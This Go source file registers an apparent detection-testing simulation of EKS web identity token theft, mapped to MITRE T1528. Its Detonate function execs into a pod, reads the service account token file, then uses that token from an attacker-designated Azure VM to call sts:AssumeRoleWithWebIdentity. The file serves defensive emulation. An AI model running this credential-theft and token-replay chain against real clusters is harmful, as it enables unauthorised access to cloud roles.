package simulations

import (
	"bytes"
	"context"
	_ "embed"
	"fmt"
	"strings"
	"time"

	"github.com/IBM/simrun/pack"
	"github.com/confluentinc/simrun-pack/simulations/shared"
	corev1 "k8s.io/api/core/v1"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	"k8s.io/client-go/kubernetes/scheme"
	"k8s.io/client-go/tools/remotecommand"
)

//go:embed main.tf
var terraform string

func init() {
	pack.Register(pack.Simulation{
		ID:   "eks-web-identity-token-theft",
		Name: "EKS Web Identity Token Theft via AssumeRoleWithWebIdentity",
		Description: `Simulates an attacker stealing an OIDC token from an EKS pod and using it
from an external Azure VM to call sts:AssumeRoleWithWebIdentity.

Warm-up:
- Creates an IAM role with a trust policy allowing AssumeRoleWithWebIdentity from the cluster's OIDC provider
- Creates a Kubernetes service account annotated with the IAM role ARN (IRSA)
- Deploys a pod with a projected service account token mounted (same as IRSA pods receive)
- Provisions an Azure VM in a random non-US region as the attacker machine

Detonation:
- Execs into the pod to steal the OIDC token (generates K8s audit events for exec operations)
- SSHs into the Azure VM and calls sts:AssumeRoleWithWebIdentity with the stolen token
- The STS call originates from the Azure VM IP (outside AWS entirely),
  which should trigger detection rules monitoring for AssumeRoleWithWebIdentity from unexpected source IPs`,
		MITRE:                     pack.MITREMapping{Tactics: []string{"TA0006"}, Techniques: []string{"T1528"}},
		Scope:                     "k8s",
		IsSlow:                    true,
		RequiresExternalResources: true,
		Terraform:                 terraform,
		Detonate:                  Detonate,
	})
}

func Detonate(ctx context.Context, input pack.DetonateInput) (*pack.Result, error) {
	log := pack.Logger(input)

	roleArn := input.TerraformOutputs["role_arn"]
	namespace := input.TerraformOutputs["namespace"]
	podName := input.TerraformOutputs["pod_name"]
	clusterName := input.TerraformOutputs["cluster_name"]
	region := input.TerraformOutputs["region"]
	attackerVmIP := input.TerraformOutputs["attacker_vm_public_ip"]
	azureRegion := input.TerraformOutputs["azure_region"]

	log.WithField("role_arn", roleArn).
		WithField("namespace", namespace).
		WithField("cluster_name", clusterName).
		WithField("attacker_vm_ip", attackerVmIP).
		WithField("azure_region", azureRegion).
		Info("Starting EKS web identity token theft simulation")

	// Step 1: Exec into the pod to steal the OIDC token
	log.WithField("pod_name", podName).
		WithField("namespace", namespace).
		Info("Step 1: Stealing OIDC token by exec into pod")

	clientset, restConfig, err := shared.NewKubernetesClient()
	if err != nil {
		return nil, fmt.Errorf("failed to create kubernetes client: %w", err)
	}

	// Wait for pod to be running
	var podReady bool
	err = pack.WaitFor(ctx, 5*time.Second, 3*time.Minute, func() bool {
		pod, getErr := clientset.CoreV1().Pods(namespace).Get(ctx, podName, metav1.GetOptions{})
		if getErr != nil {
			return false
		}
		podReady = pod.Status.Phase == corev1.PodRunning
		return podReady
	})
	if err != nil {
		return nil, fmt.Errorf("timed out waiting for pod %s to be running: %w", podName, err)
	}

	// Exec into pod to cat the token
	req := clientset.CoreV1().RESTClient().Post().
		Resource("pods").
		Name(podName).
		Namespace(namespace).
		SubResource("exec").
		VersionedParams(&corev1.PodExecOptions{
			Container: "token-holder",
			Command:   []string{"cat", "/var/run/secrets/eks.amazonaws.com/serviceaccount/token"},
			Stdout:    true,
			Stderr:    true,
		}, scheme.ParameterCodec)

	executor, err := remotecommand.NewSPDYExecutor(restConfig, "POST", req.URL())
	if err != nil {
		return nil, fmt.Errorf("failed to create exec executor: %w", err)
	}

	var stdout, stderr bytes.Buffer
	err = executor.StreamWithContext(ctx, remotecommand.StreamOptions{
		Stdout: &stdout,
		Stderr: &stderr,
	})
	if err != nil {
		return nil, fmt.Errorf("exec failed: %w (stderr: %s)", err, stderr.String())
	}

	stolenToken := strings.TrimSpace(stdout.String())
	if stolenToken == "" {
		return pack.ErrorResult(pack.ErrCodeInternalError, "extracted OIDC token is empty"), nil
	}

	log.Info("Successfully stole OIDC token via exec")

	// Step 2: SSH into Azure VM and call AssumeRoleWithWebIdentity with stolen token
	log.WithField("attacker_vm_ip", attackerVmIP).
		WithField("azure_region", azureRegion).
		Info("Step 2: Calling sts:AssumeRoleWithWebIdentity from Azure VM")

	sshClient, err := pack.SSHClientFromTerraform(input.TerraformOutputs, log)
	if err != nil {
		return nil, err
	}

	log.Info("Waiting for Azure VM to be ready")
	pack.Wait(ctx, 2*time.Minute)

	assumeCmd := fmt.Sprintf(
		`aws sts assume-role-with-web-identity --role-arn %s --role-session-name simrun-stolen-token-session --web-identity-token '%s' --region %s --output json`,
		roleArn, stolenToken, region,
	)

	_, _, err = sshClient.Run(ctx, assumeCmd)
	if err != nil {
		return nil, fmt.Errorf("AssumeRoleWithWebIdentity from Azure VM failed: %w", err)
	}

	log.Info("Successfully assumed role with stolen web identity token from Azure VM")

	return pack.SuccessResult(map[string]any{
		"attacker_vm_ip": attackerVmIP,
	}), nil
}
